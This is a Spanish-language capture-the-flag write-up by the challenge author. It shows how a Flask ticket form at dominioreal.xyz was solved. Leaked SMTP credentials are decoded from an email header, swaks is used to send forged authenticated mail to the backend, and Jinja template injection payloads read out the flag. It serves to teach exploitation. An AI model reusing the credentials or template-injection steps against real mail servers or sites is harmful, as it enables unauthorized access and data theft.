I"‹_<pre style="border: none; padding: 0;">
 /\___/\
( o ^ o )
(  &gt;o&lt;  )
(        )
(         )
(          ))))))))))
'._....._,'
</pre>

<p>En primer lugar, quiero felicitar a las 3 personas/equipos que logaron resolver el desaf√≠o. Fue algo que arm√© a la r√°pida, con mucho cari√±o y harta dificultad en mente. Como an√©cdota, quiero mencionar que las dos primeras resoluciones explotaron la vulnerabilidad de una forma distinta a la que ten√≠a planeada. Ya que esta soluci√≥n hac√≠a que el desaf√≠o fuera trivial y no dificil, decid√≠ mitigarla apenas fui avisado.</p>

<p><img src="/assets/images/2023-8dot8-00.png" alt="00" style="display:block; margin-left:auto; margin-right:auto" /></p>

<h2 id="---1-recon-inicial---">-‚Ä¶- 1. Recon inicial -‚Ä¶-</h2>
<p>La descripci√≥n del desaf√≠o habla de un grupo de desarrolladores que perdieron el control de uno de sus proyectos. Al ingresar al sitio, nos encontramos con un formulario de contacto que nos env√≠a un correo electr√≥nico cada vez que lo llenamos.</p>

<p><img src="/assets/images/2023-8dot8-01.png" alt="01" style="display:block; margin-left:auto; margin-right:auto" /></p>

<p><img src="/assets/images/2023-8dot8-02.png" alt="02" style="display:block; margin-left:auto; margin-right:auto" /></p>

<p>El repositorio en GitHub explica que el formulario corresponde a un sistema de gesti√≥n de tickets con una infraestructura innecesariamente compleja. Adjunto a las malas explicaciones se encuentra la siguiente im√°gen:</p>

<p><img src="/assets/images/2023-8dot8-03.png" alt="03" style="display:block; margin-left:auto; margin-right:auto" /></p>

<p>Ac√° podemos ver como el formulario (escrito en Flask) crea una plantilla de Jinja de manera din√°mica con los datos del usuario. Luego, la env√≠a a trav√©s de SMTP a un segundo programa que la renderiza e incluye el n√∫mero de solicitud generado de forma aleatoria. Finalmente, el mensaje completo es enviado al usuario a trav√©s de correo. Revisando el c√≥digo podemos ver la mayor√≠a de este flujo.</p>

<p>En <strong>/web/app/app.py</strong> vemos cuando se toman los datos del formulario y se sanitizan antes de ser pasados a la funci√≥n <strong>process_ticket</strong>.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">"POST"</span><span class="p">])</span>
<span class="o">@</span><span class="n">rate_limiter</span><span class="p">.</span><span class="n">limit</span><span class="p">(</span><span class="s">"10/minute"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">handle_form</span><span class="p">():</span>
    <span class="n">name</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"name"</span><span class="p">)</span>
    <span class="n">email</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"email"</span><span class="p">)</span>
    <span class="n">message</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"message"</span><span class="p">)</span>
    <span class="k">if</span> <span class="nb">all</span><span class="p">([</span><span class="n">name</span><span class="p">,</span> <span class="n">email</span><span class="p">,</span> <span class="n">message</span><span class="p">]):</span>
        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="s">"%{}()+"</span><span class="p">:</span> <span class="c1"># &lt;-- Esto fue a√±adido para mitigar la soluci√≥n unintended :)
</span>            <span class="n">name</span> <span class="o">=</span> <span class="n">name</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="s">"*"</span><span class="p">)</span>
            <span class="n">message</span> <span class="o">=</span> <span class="n">message</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="s">"*"</span><span class="p">)</span>
            <span class="n">process_ticket</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">email</span><span class="p">,</span> <span class="n">message</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">flask</span><span class="p">.</span><span class="n">make_response</span><span class="p">(</span><span class="n">flask</span><span class="p">.</span><span class="n">redirect</span><span class="p">(</span><span class="s">"/"</span><span class="p">))</span></code></pre></figure>

<p>Dentro de la funci√≥n <strong>process_ticket</strong>, se genera la plantilla de manera din√°mica y se incluye en un JSON junto con el correo del usuario. Despu√©s se llama a la funci√≥n sendmail con el JSON como argumento.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">TEMPLATE</span> <span class="o">=</span> <span class="s">"""</span><span class="se">\
</span><span class="s">Hola, {}

Gracias por tu solicitud, nos contactaremos pronto contigo.
Este es tu c√≥digo de seguimiento: {{{{ codigo }}}}

Esta es una copia de tu mensaje:
-------------------------------
{}
-------------------------------

Saludos,
Equipo de Dominio Real.
"""</span>
<span class="p">...</span>
<span class="k">def</span> <span class="nf">process_ticket</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">email</span><span class="p">,</span> <span class="n">message</span><span class="p">):</span>
    <span class="n">final_template</span> <span class="o">=</span> <span class="n">TEMPLATE</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">message</span><span class="p">)</span> <span class="c1"># Ac√° se genera la plantilla
</span>    <span class="n">json_str</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">({</span>
        <span class="s">"template"</span><span class="p">:</span> <span class="n">final_template</span><span class="p">,</span>
        <span class="s">"email"</span><span class="p">:</span> <span class="n">email</span>
    <span class="p">})</span> <span class="c1"># y ac√° el JSON
</span>    <span class="n">sendmail</span><span class="p">(</span><span class="n">json_str</span><span class="p">)</span></code></pre></figure>

<p>La funci√≥n <strong>sendmail</strong> simplemente env√≠a un correo de webform@dominioreal.xyz a solicitud@dominioreal.xyz con el JSON generado en la parte anterior en el cuerpo del mensaje.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">DOMINIO</span> <span class="o">=</span> <span class="s">"dominioreal.xyz"</span>
<span class="n">MAIL_FROM</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"webform@</span><span class="si">{</span><span class="n">DOMINIO</span><span class="si">}</span><span class="s">"</span>
<span class="n">RCPT_TO</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"solicitud@</span><span class="si">{</span><span class="n">DOMINIO</span><span class="si">}</span><span class="s">"</span>
<span class="p">...</span>
<span class="k">def</span> <span class="nf">sendmail</span><span class="p">(</span><span class="n">body</span><span class="p">):</span>
    <span class="n">msg</span> <span class="o">=</span> <span class="n">MIMEMultipart</span><span class="p">()</span>
    <span class="n">msg</span><span class="p">[</span><span class="s">'Subject'</span><span class="p">]</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"Webform - </span><span class="si">{</span><span class="n">time</span><span class="p">.</span><span class="n">ctime</span><span class="p">()</span><span class="si">}</span><span class="s">"</span>
    <span class="n">msg</span><span class="p">[</span><span class="s">'From'</span><span class="p">]</span> <span class="o">=</span> <span class="n">MAIL_FROM</span>
    <span class="n">msg</span><span class="p">[</span><span class="s">'To'</span><span class="p">]</span> <span class="o">=</span> <span class="n">RCPT_TO</span>
    <span class="n">msg</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">MIMEText</span><span class="p">(</span><span class="n">body</span><span class="p">))</span>
    <span class="k">with</span> <span class="n">SMTP</span><span class="p">(</span><span class="s">"192.155.95.27"</span><span class="p">)</span> <span class="k">as</span> <span class="n">smtp</span><span class="p">:</span>
        <span class="n">smtp</span><span class="p">.</span><span class="n">helo</span><span class="p">(</span><span class="s">"dominioreal.xyz"</span><span class="p">)</span>
        <span class="n">smtp</span><span class="p">.</span><span class="n">sendmail</span><span class="p">(</span><span class="n">MAIL_FROM</span><span class="p">,</span> <span class="n">RCPT_TO</span><span class="p">,</span> <span class="n">msg</span><span class="p">.</span><span class="n">as_string</span><span class="p">())</span></code></pre></figure>

<p>Importante mencionar que el servidor de correo que usa es 192.155.95.27, tambi√©n conocido como dominioreal.xyz</p>

<pre style="border: none; padding: 0;">
    $ nslookup 192.155.95.27
    27.95.155.192.in-addr.arpa	name = dominioreal.xyz.
</pre>

<p>Podemos suponer entonces que este corresponde al paso (1) en el diagrama, con la diferencia de que el env√≠o del correo lo hace a trav√©s de internet y no internamente como el dibujo sugiere. Esto deber√≠a abrir una serie de preguntas:</p>

<pre style="border: none; padding: 0;">
    P1. Ya que el env√≠o del correo no ocurre de forma interna y el servidor se encuentra expuesto,
    ¬øpodr√© yo enviarle correos?

    P2. Si ese es el caso, significa que me puedo comunicar con el motor de plantillas directamente,
    salt√°ndome la sanitizaci√≥n realizada por el formulario. ¬øOcurrir√° otro proceso de sanitizaci√≥n?

    P3. Si mi contenido llega intacto al motor de plantillas, ¬øpodr√© enviar una plantilla maliciosa
    explotando un SSTI?
</pre>

<p>Veamos ahora el c√≥digo de <strong>/backend/process_email.py</strong> aka. el motor de plantillas interno. Recordemos que este programa procesa todos los correos recibidos por el usuario solicitud@dominioreal.xyz de acuerdo a lo que podemos concluir de app.py junto con el diagrama.</p>

<p>Primero vemos una variable llamada <em>FLAG</em>. Esto nos hace saber inmediatamente que este es el programa que debemos explotar para resolver el desaf√≠o.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python">    <span class="n">FLAG</span> <span class="o">=</span> <span class="s">"flag{olaaa_no_soi_la_flag_confia_en_mi}"</span></code></pre></figure>

<p>Tambi√©n vemos c√≥mo el programa procesa el cuerpo del correo, extrayendo la plantilla y el correo del usuario del objeto JSON.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="p">...</span>
    <span class="c1"># Sacamos el cuerpo y lo transformamos en un diccionario
</span>    <span class="n">mail</span> <span class="o">=</span> <span class="n">mailparser</span><span class="p">.</span><span class="n">parse_from_string</span><span class="p">(</span><span class="n">raw_message</span><span class="p">)</span>
    <span class="n">info_dict</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">mail</span><span class="p">.</span><span class="n">body</span><span class="p">.</span><span class="n">strip</span><span class="p">(),</span> <span class="n">strict</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
    <span class="p">...</span></code></pre></figure>

<p>Y aqu√≠ un detalle crucial. Al renderizar la plantilla, adem√°s de pasar la variable ‚Äúcodigo‚Äù, tambi√©n incluye ‚Äúflag‚Äù, dej√°ndola en el namespace accesible por la plantilla (con un ‚Äú{{ flag }}‚Äù por ejemplo).</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="p">...</span>
    <span class="n">message_template</span> <span class="o">=</span> <span class="n">jinja2</span><span class="p">.</span><span class="n">Template</span><span class="p">(</span><span class="n">info_dict</span><span class="p">[</span><span class="s">"template"</span><span class="p">])</span>
    <span class="p">...</span>
    <span class="c1"># Renderizamos el template y lo enviamos
</span>    <span class="n">sendmail</span><span class="p">(</span><span class="n">info_dict</span><span class="p">[</span><span class="s">"email"</span><span class="p">],</span> <span class="n">message_template</span><span class="p">.</span><span class="n">render</span><span class="p">(</span>
        <span class="n">codigo</span><span class="o">=</span><span class="n">codigo_sol</span><span class="p">,</span>
        <span class="n">flag</span><span class="o">=</span><span class="n">FLAG</span> <span class="c1"># &lt;- omaigat
</span>    <span class="p">))</span></code></pre></figure>

<p>Este programa <strong>s√≠</strong> hace el env√≠o de correos de manera interna, autentic√°ndose con localhost utilizando usuario y contrase√±a. Tambi√©n hay un comentario un poco extra√±o sobre el traspaso de credenciales entre componentes.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">MAIL_FROM</span> <span class="o">=</span> <span class="s">"solicitud@dominioreal.xyz"</span>

<span class="k">def</span> <span class="nf">sendmail</span><span class="p">(</span><span class="n">user_email</span><span class="p">,</span> <span class="n">body</span><span class="p">):</span>
    <span class="n">msg</span> <span class="o">=</span> <span class="n">MIMEMultipart</span><span class="p">()</span>
    <span class="n">msg</span><span class="p">[</span><span class="s">'Subject'</span><span class="p">]</span> <span class="o">=</span> <span class="s">"Comprobante Solicitud"</span>
    <span class="n">msg</span><span class="p">[</span><span class="s">'From'</span><span class="p">]</span> <span class="o">=</span> <span class="n">MAIL_FROM</span>
    <span class="n">msg</span><span class="p">[</span><span class="s">'To'</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_email</span>
    <span class="o">&lt;</span><span class="n">b</span><span class="o">&gt;</span><span class="c1"># TODO: Ver c√≥mo integramos credenciales/tokens de autorizaci√≥n entre
</span>    <span class="c1"># componentes
</span>    <span class="n">msg</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">MIMEText</span><span class="p">(</span><span class="n">body</span><span class="p">))</span>
    <span class="k">with</span> <span class="n">SMTP</span><span class="p">(</span><span class="s">"localhost"</span><span class="p">)</span> <span class="k">as</span> <span class="n">smtp</span><span class="p">:</span>
        <span class="n">smtp</span><span class="p">.</span><span class="n">login</span><span class="p">(</span><span class="s">"USERFALSO"</span><span class="p">,</span> <span class="s">"PASSFALSA"</span><span class="p">)</span>
        <span class="n">smtp</span><span class="p">.</span><span class="n">sendmail</span><span class="p">(</span><span class="n">MAIL_FROM</span><span class="p">,</span> <span class="n">user_email</span><span class="p">,</span> <span class="n">msg</span><span class="p">.</span><span class="n">as_string</span><span class="p">())</span></code></pre></figure>

<p>Esto nos dice que el servidor postfix requiere autenticaci√≥n. Podemos validar esto conect√°ndonos directamente al servidor y validando que ofrezca el comando AUTH.</p>

<pre style="border: none; padding: 0;">
    $ ncat dominioreal.xyz 25
	220 dominioreal.xyz ESMTP Postfix (Gud yob)
	EHLO sigint
	250-dominioreal.xyz
	250-PIPELINING
	250-SIZE 10240000
	250-VRFY
	250-ETRN
	250-STARTTLS
	250-AUTH PLAIN LOGIN CRAM-MD5 DIGEST-MD5 NTLM
	250-AUTH=PLAIN LOGIN CRAM-MD5 DIGEST-MD5 NTLM
	250-ENHANCEDSTATUSCODES
	250-8BITMIME
	250-DSN
	250-SMTPUTF8
    250 CHUNKING
</pre>

<p>Con esta evidencia tratemos de responder nuestras preguntas, una por una :)</p>

<h2 id="---2-explotaci√≥n---">-‚Ä¶- 2. Explotaci√≥n -‚Ä¶-</h2>

<h2 id="---21-podr√≠a-enviar-correos-directamente-al-servidor---">-‚Ä¶- 2.1 ¬øPodr√≠a enviar correos directamente al servidor? -‚Ä¶-</h2>

<p>Saqu√©monos la duda rapidamente:</p>

<pre style="border: none; padding: 0;">
    $ swaks --to "solicitud@dominioreal.xyz" --from "webform@dominioreal.xyz" --server dominioreal.xyz:25
    === Trying dominioreal.xyz:25...
    === Connected to dominioreal.xyz.
    &lt;-  220 dominioreal.xyz ESMTP Postfix (Gud yob)
     -&gt; EHLO sigint
    &lt;-  250-dominioreal.xyz
    &lt;-  250-PIPELINING
    &lt;-  250-SIZE 10240000
    &lt;-  250-VRFY
    &lt;-  250-ETRN
    &lt;-  250-STARTTLS
    &lt;-  250-AUTH PLAIN LOGIN CRAM-MD5 DIGEST-MD5 NTLM
    &lt;-  250-AUTH=PLAIN LOGIN CRAM-MD5 DIGEST-MD5 NTLM
    &lt;-  250-ENHANCEDSTATUSCODES
    &lt;-  250-8BITMIME
    &lt;-  250-DSN
    &lt;-  250-SMTPUTF8
    &lt;-  250 CHUNKING
     -&gt; MAIL FROM:&lt;webform@dominioreal.xyz&gt;
    &lt;-  250 2.1.0 Ok
     -&gt; RCPT TO:&lt;solicitud@dominioreal.xyz&gt;
    &lt;-  550 5.7.23 &lt;solicitud@dominioreal.xyz&gt;: Recipient address rejected: Message
        rejected due to: SPF fail - not authorized. Please see
        http://www.openspf.net/Why?s=mfrom;id=webform@dominioreal.xyz;ip=xxx.xxx.xx.xx;r=&lt;UNKNOWN&gt;
     -&gt; QUIT
    &lt;-  221 2.0.0 Bye
    === Connection closed with remote host
</pre>

<p>Demonios, no estamos pasando SPF. Tiene sentido considerando que dominioreal.xyz solo permite el env√≠o de correos desde el sitio que estamos analizando.</p>

<pre style="border: none; padding: 0;">
    $ dig txt +short dominioreal.xyz
    "v=spf1 a -all"
</pre>

<p>Cambiando de foco, al analizar uno de los correos leg√≠timos que recibimos, notamos que existe una cabecera inusual: C-Auth.</p>

<pre style="border: none; padding: 0;">
    ...
    MIME-Version: 1.0
    Subject: Comprobante Solicitud
    From: solicitud@dominioreal.xyz
    To: neo@sigint.in
    C-Auth: cG9zdGZpeHNlbmRlcjpGQ0hCZzNqcmtUNkJvaEttQ3R1aExrVjlscXFuZGVOdHAK
    Message-Id: &lt;20231112014548.DD78E4BA67@dominioreal.xyz&gt;
    Date: Sun, 12 Nov 2023 01:45:48 +0000 (UTC)
    ...
</pre>

<p>Si decodificamos su valor, nos encontramos con un usuario y contrase√±a omaigat.</p>

<pre style="border: none; padding: 0;">
    $ base64 -d &lt;&lt;&lt; cG9zdGZpeHNlbmRlcjpGQ0hCZzNqcmtUNkJvaEttQ3R1aExrVjlscXFuZGVOdHAK
    postfixsender:FCHBg3jrkT6BohKmCtuhLkV9lqqndeNtp
</pre>

<p>Ahora al hacer el mismo ejercicio de antes, pero ingresando estas nuevas credenciales, logramos autenticarnos de manera exitosa con el servidor de correo y nuestro mensaje queda en la cola :)</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">    <span class="nv">$ </span>swaks <span class="nt">--to</span> <span class="s2">"solicitud@dominioreal.xyz"</span> <span class="se">\</span>
			<span class="nt">--from</span> <span class="s2">"webform@dominioreal.xyz"</span> <span class="se">\</span>
            <span class="nt">--server</span> dominioreal.xyz:25 <span class="se">\</span>
            <span class="nt">--auth-user</span> postfixsender
            <span class="nt">--auth-pass</span> FCHBg3jrkT6BohKmCtuhLkV9lqqndeNtp
	<span class="o">===</span> Trying dominioreal.xyz:25...
	<span class="o">===</span> Connected to dominioreal.xyz.
	...
	&lt;-  334 <span class="nv">PDI3NTYwMTQwOC41MjU4MDIxQGRvbWluaW9yZWFsLnh5ej4</span><span class="o">=</span>
	 -&gt; <span class="nv">cG9zdGZpeHNlbmRlciBjN2Y2ZDI0ZDE2ZmMxNzg0NTM0YmEyM2VmN2E5OTI5Ng</span><span class="o">==</span>
	&lt;-  235 2.7.0 Authentication successful
	 -&gt; MAIL FROM:&lt;webform@dominioreal.xyz&gt;
	&lt;-  250 2.1.0 Ok
	 -&gt; RCPT TO:&lt;solicitud@dominioreal.xyz&gt;
	&lt;-  250 2.1.5 Ok
	 -&gt; DATA
	&lt;-  354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
	 -&gt; Date: Sat, 11 Nov 2023 23:38:55 <span class="nt">-0300</span>
	 -&gt; To: solicitud@dominioreal.xyz
	 -&gt; From: webform@dominioreal.xyz
	 -&gt; Subject: <span class="nb">test </span>Sat, 11 Nov 2023 23:38:55 <span class="nt">-0300</span>
	 -&gt; Message-Id: &lt;20231111233855.149458@acheron&gt;
	...
	&lt;-  250 2.0.0 Ok: queued as 0F6794BA66
	 -&gt; QUIT
	&lt;-  221 2.0.0 Bye
    <span class="o">===</span> Connection closed with remote host.</code></pre></figure>

<p>A√∫n as√≠, no recibimos nada en nuestra casilla. Pero no lo olvidemos, el backend espera que el cuerpo del correo sea un objeto JSON! Intentemos de nuevo con un mensaje v√°lido.</p>

<pre style="border: none; padding: 0;">
    $ swaks --to "solicitud@dominioreal.xyz" \
            --from "webform@dominioreal.xyz" \
            --server dominioreal.xyz:25 \
            --auth-user postfixsender \
            --auth-pass FCHBg3jrkT6BohKmCtuhLkV9lqqndeNtp \
            --body '{"template":"test","email":"neo@sigint.in"}'
</pre>

<p><img src="/assets/images/2023-8dot8-04.png" alt="04" style="display:block; margin-left:auto; margin-right:auto" /></p>

<p>La respuesta entonces es s√≠, podemos enviar correos forjados!!</p>

<h2 id="---22-ocurrir√°-otro-proceso-de-sanitizaci√≥n---">-‚Ä¶- 2.2 ¬øOcurrir√° otro proceso de sanitizaci√≥n? -‚Ä¶-</h2>

<p>Recordemos cu√°les son los car√°cteres eliminados por el formulario:</p>

<pre style="border: none; padding: 0;">
@app.route("/", methods=["POST"])
@rate_limiter.limit("10/minute")
def handle_form():
    ...
    if all([name, email, message]):
        for c in "%{}()+":
            name = name.replace(c, "*")
            message = message.replace(c, "*")
    ...
</pre>

<p>En <strong>/backend/process_email.py</strong> nunca se sanitiza el contenido, porque se asume que ya viene limpio del frontend. Podemos validar esto enviando un correo con car√°cteres prohibidos.</p>

<pre style="border: none; padding: 0;">
    $ swaks --to "solicitud@dominioreal.xyz" \
            --from "webform@dominioreal.xyz" \
            --server dominioreal.xyz:25 \
            --auth-user postfixsender \
            --auth-pass FCHBg3jrkT6BohKmCtuhLkV9lqqndeNtp \
            --body '{"template":"%{}()+","email":"neo@sigint.in"}'
</pre>

<p><img src="/assets/images/2023-8dot8-05.png" alt="05" style="display:block; margin-left:auto; margin-right:auto" /></p>

<p>Fant√°stico, efectivamente no ocurre otro proceso de sanitizaci√≥n.</p>

<h2 id="---23-podr√©-enviar-una-plantilla-maliciosa-explotando-un-ssti---">-‚Ä¶- 2.3 ¬øPodr√© enviar una plantilla maliciosa explotando un SSTI? -‚Ä¶-</h2>

<p>Si bien hay mil y un formas de validar esto, partamos enviando a ya saben qui√©n:</p>

<pre style="border: none; padding: 0;">
{"template":"{{7*7}}","email":"neo@sigint.in"}
</pre>

<p><img src="/assets/images/2023-8dot8-06.png" alt="06" style="display:block; margin-left:auto; margin-right:auto" /></p>

<p>Ahora es cosa de recordar las variables que se inyectan en el namespace del template: codigo y flag. Veamos ambas:</p>

<pre style="border: none; padding: 0;">
{"template":"{{codigo}} {{flag}}","email":"neo@sigint.in"}
</pre>

<p><img src="/assets/images/2023-8dot8-07.png" alt="07" style="display:block; margin-left:auto; margin-right:auto" /></p>

<p>Y tenemos la flag :)
<strong>flag{4ut3nt1c4c1on_SMTP?}</strong></p>
:ET